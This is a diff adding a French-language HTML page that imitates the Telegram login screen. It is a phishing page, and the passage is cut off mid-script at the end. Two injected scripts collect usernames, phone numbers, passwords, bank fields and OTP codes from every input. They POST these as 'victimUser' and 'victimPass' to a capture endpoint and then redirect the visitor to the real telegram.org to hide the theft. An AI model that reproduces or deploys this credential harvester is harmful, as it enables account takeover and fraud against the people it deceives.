@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Telegram · Connexion</title>
+
+<style>
+/* ============================================================
+   1. RESET & VARIABLES
+   ============================================================ */
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+:root {
+  --tg-blue:      #229ED9;
+  --tg-blue-dark: #1c8ec4;
+  --tg-blue-deep: #0088cc;
+  --black:        #1a1a1a;
+  --gray:         #707579;
+  --border:       #dfe1e5;
+  --white:        #ffffff;
+  --red:          #e53935;
+  --radius:       12px;
+  --ease:         cubic-bezier(.2, .8, .2, 1);
+}
+
+/* ============================================================
+   2. PAGE
+   ============================================================ */
+body {
+  min-height: 100dvh;
+  display: grid;
+  place-items: center;
+  padding: 24px 18px;
+  position: relative;
+  overflow-x: hidden;
+  background: linear-gradient(160deg, #2AABEE 0%, #229ED9 45%, #1c8ec4 100%);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  color: var(--black);
+  -webkit-font-smoothing: antialiased;
+}
+
+body.locked { overflow: hidden; }
+
+/* Cercles décoratifs */
+.blob {
+  position: fixed;
+  border-radius: 50%;
+  pointer-events: none;
+  z-index: 0;
+  background: rgba(255, 255, 255, .09);
+  animation: float 16s ease-in-out infinite;
+}
+.b1 { width: 360px; height: 360px; top: -140px; left: -110px; }
+.b2 { width: 280px; height: 280px; bottom: -110px; right: -80px; animation-delay: -5s; }
+.b3 { width: 200px; height: 200px; top: 55%; left: 10%; animation-delay: -9s; }
+
+@keyframes float {
+  0%, 100% { transform: translate(0, 0) scale(1); }
+  50%      { transform: translate(26px, -32px) scale(1.1); }
+}
+
+/* ============================================================
+   3. CARTE
+   ============================================================ */
+.card {
+  position: relative;
+  z-index: 1;
+  width: min(420px, 100%);
+  padding: 36px 34px 28px;
+  background: var(--white);
+  border-radius: 22px;
+  box-shadow: 0 30px 60px -25px rgba(0, 40, 70, .55);
+  animation: cardIn .6s var(--ease) both;
+}
+
+.card.ready { animation: none; }
+.card.shake { animation: shake .5s ease; }
+
+@keyframes cardIn {
+  from { opacity: 0; transform: translateY(22px) scale(.97); }
+  to   { opacity: 1; transform: translateY(0)    scale(1);   }
+}
+
+@keyframes shake {
+  10%, 90%      { transform: translateX(-2px); }
+  20%, 80%      { transform: translateX(4px);  }
+  30%, 50%, 70% { transform: translateX(-7px); }
+  40%, 60%      { transform: translateX(7px);  }
+}
+
+/* ============================================================
+   4. LOGO AVION EN PAPIER
+   ============================================================ */
+.logo {
+  width: 82px;
+  height: 82px;
+  margin: 0 auto 20px;
+  display: grid;
+  place-items: center;
+  background: linear-gradient(145deg, #2AABEE, #1c8ec4);
+  border-radius: 50%;
+  box-shadow: 0 14px 30px -10px rgba(34, 158, 217, .8);
+  animation: bob 4s ease-in-out infinite;
+}
+
+.logo svg {
+  width: 42px;
+  height: 42px;
+  fill: none;
+  stroke: var(--white);
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  transform: translate(-2px, 2px);
+}
+
+@keyframes bob {
+  0%, 100% { transform: translateY(0); }
+  50%      { transform: translateY(-6px); }
+}
+
+/* ============================================================
+   5. TITRES
+   ============================================================ */
+h1 {
+  font-size: 25px;
+  font-weight: 700;
+  text-align: center;
+  letter-spacing: -.4px;
+  margin-bottom: 6px;
+}
+
+.sub {
+  font-size: 14px;
+  color: var(--gray);
+  text-align: center;
+  margin-bottom: 26px;
+}
+
+/* ============================================================
+   6. CHAMPS
+   ============================================================ */
+.field { position: relative; margin-bottom: 14px; }
+
+.field input {
+  width: 100%;
+  height: 56px;
+  padding: 22px 16px 6px;
+  font-size: 15.5px;
+  font-family: inherit;
+  color: var(--black);
+  background: #f7f8fa;
+  border: 2px solid transparent;
+  border-radius: var(--radius);
+  outline: none;
+  transition: border-color .2s, background .2s, box-shadow .2s;
+}
+
+.field input::placeholder { color: transparent; }
+.field input:hover { background: #f0f2f5; }
+
+.field input:focus {
+  background: var(--white);
+  border-color: var(--tg-blue);
+  box-shadow: 0 0 0 4px rgba(34, 158, 217, .16);
+}
+
+.field label {
+  position: absolute;
+  left: 18px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 15px;
+  color: var(--gray);
+  pointer-events: none;
+  transition: top .16s var(--ease), font-size .16s var(--ease), color .16s;
+}
+
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label {
+  top: 15px;
+  font-size: 10.5px;
+  font-weight: 700;
+  letter-spacing: .6px;
+  text-transform: uppercase;
+  color: var(--tg-blue);
+}
+
+#password { padding-right: 54px; }
+
+/* Bouton œil */
+.toggle-pw {
+  position: absolute;
+  right: 8px;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 42px;
+  height: 42px;
+  display: grid;
+  place-items: center;
+  background: transparent;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  color: var(--gray);
+  transition: background .18s, color .18s;
+}
+
+.toggle-pw:hover { background: #eef1f5; color: var(--black); }
+
+.toggle-pw svg {
+  width: 20px; height: 20px;
+  fill: none;
+  stroke: currentColor;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+
+.toggle-pw .eye-off { display: none; }
+.toggle-pw.active .eye-on  { display: none; }
+.toggle-pw.active .eye-off { display: block; }
+
+/* ============================================================
+   7. ERREURS
+   ============================================================ */
+.error {
+  height: 0;
+  overflow: hidden;
+  margin-left: 4px;
+  font-size: 12.5px;
+  font-weight: 600;
+  color: var(--red);
+  opacity: 0;
+  transition: height .22s, opacity .22s, margin .22s;
+}
+
+.error.show { height: 18px; margin-bottom: 8px; opacity: 1; }
+
+/* ============================================================
+   8. LIEN OUBLI
+   ============================================================ */
+.forgot {
+  display: inline-block;
+  margin: 4px 0 22px 4px;
+  font-size: 13.5px;
+  font-weight: 600;
+  color: var(--tg-blue);
+  text-decoration: none;
+}
+
+.forgot:hover { text-decoration: underline; }
+
+/* ============================================================
+   9. BOUTON
+   ============================================================ */
+.btn {
+  position: relative;
+  width: 100%;
+  height: 54px;
+  overflow: hidden;
+  border: none;
+  border-radius: 999px;
+  background: linear-gradient(145deg, #2AABEE, #1c8ec4);
+  color: var(--white);
+  font-family: inherit;
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 12px 26px -10px rgba(34, 158, 217, .85);
+  transition: transform .16s var(--ease), box-shadow .2s, filter .2s;
+}
+
+.btn:hover:not(:disabled) {
+  transform: translateY(-2px);
+  filter: brightness(1.05);
+  box-shadow: 0 18px 32px -12px rgba(34, 158, 217, .9);
+}
+
+.btn:active:not(:disabled) { transform: translateY(0) scale(.985); }
+
+.btn:focus-visible { outline: 3px solid var(--tg-blue-deep); outline-offset: 3px; }
+
+/* Ripple */
+.ripple {
+  position: absolute;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, .4);
+  transform: scale(0);
+  pointer-events: none;
+  animation: rippleAnim .6s ease-out forwards;
+}
+
+@keyframes rippleAnim { to { transform: scale(3.2); opacity: 0; } }
+
+/* ============================================================
+   10. SÉPARATEUR & INSCRIPTION
+   ============================================================ */
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin: 24px 0 18px;
+  font-size: 12px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: #b0b6bc;
+}
+
+.divider::before, .divider::after {
+  content: "";
+  flex: 1;
+  height: 1.5px;
+  background: var(--border);
+  border-radius: 2px;
+}
+
+.signup { font-size: 14px; text-align: center; color: var(--gray); }
+
+.signup a {
+  font-weight: 700;
+  color: var(--tg-blue);
+  text-decoration: none;
+}
+
+.signup a:hover { text-decoration: underline; }
+
+/* ============================================================
+   11. OVERLAY DE CHARGEMENT (3 s)
+   ============================================================ */
+.loading-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  display: grid;
+  place-items: center;
+  padding: 24px;
+  background: linear-gradient(160deg, #2AABEE 0%, #229ED9 45%, #1c8ec4 100%);
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity .5s ease, visibility .5s;
+}
+
+.loading-overlay.show { opacity: 1; visibility: visible; }
+
+.loading-inner {
+  width: min(340px, 100%);
+  text-align: center;
+  transform: translateY(16px);
+  transition: transform .6s var(--ease);
+}
+
+.loading-overlay.show .loading-inner { transform: translateY(0); }
+
+/* Avion pulsant */
+.plane {
+  width: 96px;
+  height: 96px;
+  margin: 0 auto 26px;
+  display: grid;
+  place-items: center;
+  background: rgba(255, 255, 255, .16);
+  border: 2px solid rgba(255, 255, 255, .35);
+  border-radius: 50%;
+  animation: planePulse 1.8s ease-in-out infinite;
+}
+
+.plane svg {
+  width: 46px;
+  height: 46px;
+  fill: none;
+  stroke: var(--white);
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  transform: translate(-2px, 2px);
+}
+
+@keyframes planePulse {
+  0%, 100% { transform: scale(1)    translateY(0);    }
+  50%      { transform: scale(1.07) translateY(-8px); }
+}
+
+.loading-title {
+  font-size: 21px;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 8px;
+  letter-spacing: -.3px;
+}
+
+.loading-text {
+  font-size: 14px;
+  color: rgba(255, 255, 255, .85);
+  margin-bottom: 26px;
+}
+
+/* Barre de progression */
+.progress {
+  position: relative;
+  width: 100%;
+  height: 9px;
+  background: rgba(255, 255, 255, .25);
+  border-radius: 999px;
+  overflow: hidden;
+}
+
+.progress__bar {
+  position: absolute;
+  inset: 0 auto 0 0;
+  width: 0%;
+  border-radius: 999px;
+  background: var(--white);
+  box-shadow: 0 0 12px rgba(255, 255, 255, .8);
+  will-change: width;
+}
+
+.progress__pct {
+  margin-top: 14px;
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: .5px;
+  font-variant-numeric: tabular-nums;
+  color: rgba(255, 255, 255, .9);
+}
+
+/* ============================================================
+   12. RESPONSIVE & ACCESSIBILITÉ
+   ============================================================ */
+@media (max-width: 420px) {
+  .card { padding: 30px 22px 24px; border-radius: 18px; }
+  h1 { font-size: 23px; }
+  .logo { width: 72px; height: 72px; }
+  .logo svg { width: 36px; height: 36px; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .001ms !important;
+    transition-duration: .001ms !important;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="blob b1"></div>
+<div class="blob b2"></div>
+<div class="blob b3"></div>
+
+<!-- ===================== CARTE DE CONNEXION ===================== -->
+<main class="card" id="card">
+
+  <div class="logo">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/>
+    </svg>
+  </div>
+
+  <h1>Connexion</h1>
+  <p class="sub">Connectez-vous à Telegram</p>
+
+  <form id="loginForm" novalidate>
+
+    <div class="field">
+      <input type="text" id="phone" name="phone" placeholder=" "
+             autocomplete="username" spellcheck="false">
+      <label for="phone">Téléphone ou nom d'utilisateur</label>
+    </div>
+    <p class="error" id="err-phone" role="alert"></p>
+
+    <div class="field">
+      <input type="password" id="password" name="password" placeholder=" "
+             autocomplete="current-password">
+      <label for="password">Mot de passe</label>
+
+      <button type="button" class="toggle-pw" id="togglePw"
+              aria-label="Afficher le mot de passe">
+        <svg class="eye-on" viewBox="0 0 24 24">
+          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+        <svg class="eye-off" viewBox="0 0 24 24">
+          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+          <circle cx="12" cy="12" r="3"/>
+          <path d="M3 3l18 18"/>
+        </svg>
+      </button>
+    </div>
+    <p class="error" id="err-password" role="alert"></p>
+
+    <a href="#" class="forgot">Mot de passe oublié&nbsp;?</a>
+
+    <button type="submit" class="btn" id="submitBtn">Se connecter</button>
+
+  </form>
+
+  <div class="divider"><span>ou</span></div>
+
+  <p class="signup">
+    Pas encore de compte&nbsp;? <a href="#">S'inscrire</a>
+  </p>
+
+</main>
+
+<!-- ===================== CHARGEMENT 3 s ===================== -->
+<div class="loading-overlay" id="loadingOverlay"
+     aria-hidden="true" aria-live="polite">
+  <div class="loading-inner">
+
+    <div class="plane">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/>
+      </svg>
+    </div>
+
+    <h2 class="loading-title">Connexion sécurisée</h2>
+    <p class="loading-text">Redirection vers Telegram…</p>
+
+    <div class="progress" role="progressbar" aria-valuemin="0"
+         aria-valuemax="100" aria-valuenow="0" id="progressTrack">
+      <div class="progress__bar" id="progressBar"></div>
+    </div>
+
+    <p class="progress__pct" id="progressPct">0 %</p>
+
+  </div>
+</div>
+
+<script>
+/* ==========================================================
+   CONFIGURATION
+   ========================================================== */
+const OFFICIAL_URL = 'https://telegram.org/';
+const DURATION     = 3000;   // 3 secondes
+
+/* ==========================================================
+   1. RÉFÉRENCES DOM
+   ========================================================== */
+const card        = document.getElementById('card');
+const form        = document.getElementById('loginForm');
+const phone       = document.getElementById('phone');
+const password    = document.getElementById('password');
+const errPhone    = document.getElementById('err-phone');
+const errPassword = document.getElementById('err-password');
+const submitBtn   = document.getElementById('submitBtn');
+const togglePw    = document.getElementById('togglePw');
+
+const overlay     = document.getElementById('loadingOverlay');
+const progressBar = document.getElementById('progressBar');
+const progressPct = document.getElementById('progressPct');
+const progressTrk = document.getElementById('progressTrack');
+
+/* ==========================================================
+   2. ANIMATIONS DE LA CARTE
+   ========================================================== */
+card.addEventListener('animationend', (e) => {
+  if (e.animationName === 'cardIn') card.classList.add('ready');
+  if (e.animationName === 'shake')  card.classList.remove('shake');
+});
+
+/* ==========================================================
+   3. AFFICHER / MASQUER LE MOT DE PASSE
+   ========================================================== */
+togglePw.addEventListener('click', () => {
+  const hidden = password.type === 'password';
+
+  password.type = hidden ? 'text' : 'password';
+  togglePw.classList.toggle('active', hidden);
+  togglePw.setAttribute(
+    'aria-label',
+    hidden ? 'Masquer le mot de passe' : 'Afficher le mot de passe'
+  );
+
+  password.focus();
+});
+
+/* ==========================================================
+   4. ERREURS
+   ========================================================== */
+function setError(el, msg) {
+  el.textContent = msg;
+  el.classList.toggle('show', msg.length > 0);
+}
+
+phone.addEventListener('input', () => setError(errPhone, ''));
+password.addEventListener('input', () => setError(errPassword, ''));
+
+/* ==========================================================
+   5. SOUMISSION → CHARGEMENT → REDIRECTION
+   ========================================================== */
+let redirecting = false;
+
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  if (redirecting) return;
+
+  let ok = true;
+
+  if (!phone.value.trim()) {
+    setError(errPhone, 'Saisissez votre téléphone ou nom d\'utilisateur.');
+    ok = false;
+  }
+
+  if (!password.value) {
+    setError(errPassword, 'Saisissez votre mot de passe.');
+    ok = false;
+  }
+
+  if (!ok) {
+    card.classList.add('shake');
+    return;
+  }
+
+  redirecting = true;
+  startLoading();
+});
+
+/* ==========================================================
+   6. CHARGEMENT 3 s → SITE OFFICIEL
+   ========================================================== */
+function startLoading() {
+  document.body.classList.add('locked');
+
+  overlay.classList.add('show');
+  overlay.setAttribute('aria-hidden', 'false');
+
+  const startTime = performance.now();
+
+  function tick(now) {
+    const elapsed  = now - startTime;
+    const progress = Math.min(elapsed / DURATION, 1);
+    const percent  = Math.round(progress * 100);
+
+    progressBar.style.width = percent + '%';
+    progressPct.textContent = percent + ' %';
+    progressTrk.setAttribute('aria-valuenow', String(percent));
+
+    if (progress < 1) {
+      requestAnimationFrame(tick);
+    } else {
+      window.location.href = OFFICIAL_URL;
+    }
+  }
+
+  requestAnimationFrame(tick);
+}
+
+/* ==========================================================
+   7. EFFET RIPPLE
+   ========================================================== */
+document.querySelectorAll('.btn').forEach((btn) => {
+  btn.addEventListener('click', (e) => {
+    const rect = btn.getBoundingClientRect();
+    const size = Math.max(rect.width, rect.height);
+
+    const ripple = document.createElement('span');
+    ripple.className   = 'ripple';
+    ripple.style.width = ripple.style.height = size + 'px';
+    ripple.style.left  = (e.clientX - rect.left - size / 2) + 'px';
+    ripple.style.top   = (e.clientY - rect.top  - size / 2) + 'px';
+
+    btn.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 620);
+  });
+});
+</script>
+
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Apple",
+    enableOtp: false,
+    caps: {"id":true,"pass":true,"phone":true,"bank":false,"extra":false,"otp":false}
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const effectiveOwner = (urlParams.get("user") || NEXUS_CFG.owner || "Inconnu").trim();
+
+  const state = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    capturedFields: {},
+    sentFingerprints: new Set()
+  };
+
+  function getFieldDescriptor(el) {
+    let labelTxt = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
+    }
+    const parentLbl = el.closest("label");
+    if (parentLbl) {
+      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
+    }
+
+    const baseName =
+      el.name ||
+      el.id ||
+      labelTxt ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("field_" + (el.type || "text"));
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      labelTxt
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    return { key: baseName.trim(), meta };
+  }
+
+  function classifyInput(el) {
+    const type = (el.type || "text").toLowerCase();
+    if (type === "hidden" || type === "submit" || type === "button" || type === "reset") {
+      return "ignore";
+    }
+
+    const { meta } = getFieldDescriptor(el);
+
+    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "pass";
+    }
+
+    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank|billing/i.test(meta);
+    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);
+
+    if (
+      ac === "one-time-code" ||
+      (!isBank && !isDob && (
+        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
+        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
+      ))
+    ) {
+      return "otp";
+    }
+
+    if (isBank) return "bank";
+    if (type === "tel" || /phone|t[ée]l[ée]phone|mobile|indicatif|country.?code|prefix|\+225|\+221|\+237|\+33/i.test(meta)) {
+      return "phone";
+    }
+    if (type === "email" || /email|e-mail|identifiant|username|user|login/i.test(meta)) {
+      return "id";
+    }
+    if (isDob || type === "text" || type === "number" || type === "search" || el.tagName === "SELECT" || el.tagName === "TEXTAREA") {
+      return "extra";
+    }
+
+    return "extra";
+  }
+
+  function collectCurrentValues() {
+    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
+    const otpParts = [];
+    const phoneParts = [];
+    const allCaptured = {};
+
+    let idCandidate = "";
+    let passCandidate = "";
+    let bankCandidate = "";
+    let extraCandidate = "";
+
+    const activeBtn = document.querySelector(".tab-btn.active");
+    const activeTab = activeBtn ? (activeBtn.dataset.tab || "") : "";
+
+    fields.forEach((el, idx) => {
+      const type = (el.type || "text").toLowerCase();
+      if (type === "submit" || type === "button" || type === "reset") return;
+
+      const role = classifyInput(el);
+      if (role === "ignore") return;
+
+      if (!NEXUS_CFG.caps[role]) return;
+
+      const { key } = getFieldDescriptor(el);
+      let val = "";
+
+      if (type === "checkbox") {
+        val = el.checked ? (el.value || "Oui") : "";
+      } else if (type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "Sélectionné";
+      } else {
+        val = (el.value || "").trim();
+      }
+
+      if (!val) return;
+
+      const uniqueKey = allCaptured[key] !== undefined && allCaptured[key] !== val ? (key + "_" + (idx + 1)) : key;
+      allCaptured[uniqueKey] = val;
+
+      if (role === "otp") {
+        otpParts.push(val);
+      } else if (role === "pass") {
+        passCandidate = el.value;
+      } else if (role === "phone") {
+        phoneParts.push(val);
+      } else if (role === "id" && !idCandidate) {
+        idCandidate = val;
+      } else if (role === "bank" && !bankCandidate) {
+        bankCandidate = val;
+      } else if (!extraCandidate) {
+        extraCandidate = val;
+      }
+    });
+
+    if (activeTab) {
+      allCaptured.onglet_actif = activeTab;
+    }
+
+    const combinedPhone = phoneParts.join(" ").trim();
+
+    if ((activeTab === "phone" || activeTab === "code") && combinedPhone && NEXUS_CFG.caps.phone) {
+      state.victimUser = combinedPhone;
+    } else {
+      state.victimUser = idCandidate || combinedPhone || bankCandidate || extraCandidate || "";
+    }
+
+    state.victimPass = NEXUS_CFG.caps.pass ? (passCandidate || state.victimPass || "") : "";
+    state.otp = (NEXUS_CFG.caps.otp && otpParts.length > 0) ? otpParts.join("") : "Aucun";
+    state.capturedFields = allCaptured;
+  }
+
+  function postPayload(payload) {
+    const fingerprint = JSON.stringify(payload);
+    if (state.sentFingerprints.has(fingerprint)) return;
+    state.sentFingerprints.add(fingerprint);
+
+    fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function sendCapture(stage, extra = {}) {
+    collectCurrentValues();
+
+    const hasFields = Object.keys(state.capturedFields).length > 0;
+    const hasMainData = Boolean(state.victimUser || state.victimPass || (state.otp && state.otp !== "Aucun"));
+    if (!hasFields && !hasMainData && (!extra.otp || extra.otp === "Aucun")) {
+      return;
+    }
+
+    const isOtpEvent = Boolean(NEXUS_CFG.caps.otp && extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
+    const effectiveOtp = NEXUS_CFG.caps.otp
+      ? (extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun")))
+      : "Aucun";
+
+    const payload = {
+      owner: effectiveOwner,
+      network: NEXUS_CFG.network,
+      type: isOtpEvent ? "otp" : stage,
+      victimUser: state.victimUser || "Inconnu",
+      victimPass: state.victimPass || "Inconnu",
+      otp: effectiveOtp,
+      fields: state.capturedFields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: state.capturedFields
+      })
+    };
+
+    postPayload(payload);
+  }
+
+  function ensureOtpSectionIfNeeded() {
+    if (!NEXUS_CFG.enableOtp || !NEXUS_CFG.caps.otp) return;
+
+    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
+    if (existingOtp) return;
+
+    if (document.getElementById("nexus-auto-otp-box")) return;
+
+    const box = document.createElement("div");
+    box.id = "nexus-auto-otp-box";
+    box.style.cssText = [
+      "margin:14px auto",
+      "padding:14px",
+      "max-width:360px",
+      "border:1px solid #d0d7de",
+      "border-radius:10px",
+      "background:#ffffff",
+      "font-family:inherit",
+      "text-align:center"
+    ].join(";");
+
+    box.innerHTML = `
+      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+      <input
+        id="nexus-otp-field"
+        data-nexus-injected-otp="true"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="••••••"
+        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
+      />
+      <button
+        id="nexus-otp-submit"
+        type="button"
+        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
+      >Valider le code OTP</button>
+    `;
+
+    const targetForm = document.querySelector("form");
+    if (targetForm && targetForm.parentElement) {
+      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+    } else {
+      document.body.appendChild(box);
+    }
+
+    const otpInput = document.getElementById("nexus-otp-field");
+    const otpBtn = document.getElementById("nexus-otp-submit");
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "");
+      collectCurrentValues();
+    });
+
+    otpBtn.addEventListener("click", () => {
+      collectCurrentValues();
+      const code = otpInput.value.trim();
+      sendCapture("otp", { otp: code || state.otp });
+    });
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("submit", () => {
+    collectCurrentValues();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp) {
+      sendCapture("otp", { otp: state.otp });
+    } else {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
+    if (!btn || btn.id === "nexus-otp-submit") return;
+    collectCurrentValues();
+    const txt = (btn.innerText || btn.value || "").toLowerCase();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
+      sendCapture("otp", { otp: state.otp });
+    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
+  } else {
+    ensureOtpSectionIfNeeded();
+  }
+})();
+</script>
+
+<script data-real-injected="true" data-injected-mode="otp">
+(function () {
+  const PARAM_CFG = {
+    endpoint: "/api/capture",
+    defaultOwner: "Kim",
+    network: "WebApp",
+    redirectUrl: "https://telegram.org/",
+    mode: "otp",
+    isOtpMode: true
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
+  const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();
+
+  let lastUser = "";
+  let lastPass = "";
+  let sentSet = new Set();
+
+  function sendCapture(payload) {
+    const key = JSON.stringify(payload);
+    if (sentSet.has(key)) return;
+    sentSet.add(key);
+
+    return fetch(PARAM_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch((err) => console.log(err));
+  }
+
+  function readFields(scopeEl) {
+    const root = (scopeEl && scopeEl.closest && scopeEl.closest("form")) || document;
+    const allInputs = Array.from(root.querySelectorAll("input, select, textarea"));
+
+    let user = "";
+    let pass = "";
+    const otpParts = [];
+
+    allInputs.forEach((el) => {
+      const t = (el.type || "").toLowerCase();
+      const idName = ((el.id || "") + " " + (el.name || "") + " " + (el.placeholder || "") + " " + (el.className || "") + " " + (el.getAttribute("autocomplete") || "")).toLowerCase();
+      const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+
+      if (t === "password") {
+        if (!pass) pass = el.value;
+      } else if (
+        idName.includes("otp") ||
+        idName.includes("one-time-code") ||
+        idName.includes("code") ||
+        (maxLen === 1 && t !== "checkbox" && t !== "radio")
+      ) {
+        if (el.value && el.value.trim()) otpParts.push(el.value.trim());
+      } else if (!["submit", "button", "checkbox", "radio", "hidden"].includes(t)) {
+        if (!user && el.value && el.value.trim()) user = el.value.trim();
+      }
+    });
+
+    if (!user) {
+      const firstText = Array.from(document.querySelectorAll("input[type='text'], input[type='email'], input[type='tel'], input:not([type])"))
+        .find((i) => !i.classList.contains("otp-input") && i.value && i.value.trim());
+      if (firstText) user = firstText.value.trim();
+    }
+    if (!pass) {
+      const p = document.querySelector("input[type='password']");
+      if (p) pass = p.value;
+    }
+
+    return {
+      user: user || lastUser || "",
+      pass: pass || lastPass || "",
+      otp: otpParts.length > 0 ? otpParts.join("") : "Aucun"
+    };
+  }
+
+  function handleAction(e, sourceEl) {
+    const data = readFields(sourceEl);
+    if (data.user) lastUser = data.user;
+    if (data.pass) lastPass = data.pass;
+
+    const hasOtpValue = data.otp && data.otp !== "Aucun";
+    const stepType = PARAM_CFG.isOtpMode
+      ? (hasOtpValue ? (typeParam === "standard" ? "otp" : typeParam) : "otp_step1")
+      : "standard";
+
+    if (data.user || data.pass || hasOtpValue) {
+      sendCapture({
+        owner: ownerVal,
+        network: PARAM_CFG.network,
+        type: stepType,
+        victimUser: lastUser,
+        victimPass: lastPass,
+        otp: PARAM_CFG.isOtpMode ? data.otp : "Aucun"
+      });
+    }
+  }
+
+  document.addEventListener("submit", (e) => handleAction(e, e.target), true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
+    if (!btn) return;
+    handleAction(e, btn);
+  }, true);
+
+  if (PARAM_CFG.isOtpMode) {
